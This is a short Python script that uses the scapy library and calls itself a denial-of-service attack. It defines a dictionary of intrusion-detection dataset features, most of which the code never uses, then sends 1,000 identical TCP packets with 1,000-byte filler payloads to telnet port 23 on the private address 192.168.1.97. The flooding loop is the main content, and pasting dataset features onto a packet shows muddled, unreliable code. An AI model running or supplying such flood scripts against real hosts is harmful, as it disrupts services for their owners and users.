from scapy.all import IP, TCP, send, Raw

# Define the data for the DoS attack
dos_data = {
    'duration': 0,
    'protocol_type': 'tcp',
    'service': 'telnet',
    'flag': 'SF',
    'src_bytes': 1511,
    'dst_bytes': 2957,
    'land': 0,
    'wrong_fragment': 0,
    'urgent': 0,
    'hot': 3,
    'num_failed_logins': 0,
    'logged_in': 1,
    'lnum_compromised': 2,
    'lroot_shell': 1,
    'lsu_attempted': 0,
    'lnum_root': 1,
    'lnum_file_creations': 0,
    'lnum_shells': 0,
    'lnum_access_files': 0,
    'lnum_outbound_cmds': 0,
    'is_host_login': 0,
    'is_guest_login': 0,
    'count': 1,
    'srv_count': 1,
    'serror_rate': 0,
    'srv_serror_rate': 0,
    'rerror_rate': 0,
    'srv_rerror_rate': 0,
    'same_srv_rate': 1,
    'diff_srv_rate': 0.67,
    'srv_diff_host_rate': 0,
    'dst_host_count': 0,
    'dst_host_srv_count': 0,
    'dst_host_same_srv_rate': 1,
    'dst_host_diff_srv_rate': 0,
    'dst_host_same_src_port_rate': 0,
    'dst_host_srv_diff_host_rate': 0,
    'dst_host_serror_rate': 0,
    'dst_host_srv_serror_rate': 0,
    'dst_host_rerror_rate': 0,
    'dst_host_srv_rerror_rate': 0
}

# Craft the packet
packet = IP(dst="192.168.1.97") / TCP()
packet.duration = dos_data['duration']
packet.sport = 12345  # Source port (random)
packet.dport = 23  # Destination port (Telnet)
packet.window = 8192  # TCP window size
packet.payload = Raw(load="X" * 1000)  # Payload

# Define the number of packets to send in the loop
num_packets = 1000  # Adjust as needed

# Send the packet in a loop
for _ in range(num_packets):
    send(packet)
